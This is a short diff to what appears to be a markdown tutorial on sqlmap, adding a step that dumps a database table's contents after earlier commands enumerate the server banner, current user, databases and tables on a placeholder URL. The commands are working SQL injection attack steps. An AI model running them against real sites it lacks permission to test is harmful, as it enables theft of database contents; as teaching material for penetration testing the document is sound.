@@ -46,3 +46,7 @@ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --
 ```bash
 sqlmap -u "http://www.example.com/?id=1" --tables -D [DATABASE_NAME]
 ```
+After identifying the name of the table of interest, you can retrieve its content using the --dump option and specifying the name of the table with -T users, like this:
+```bash
+sqlmap -u "http://www.example.com/?id=1" --dump -T [TABLE_NAME] -D [DATABASE_NAME]
+```
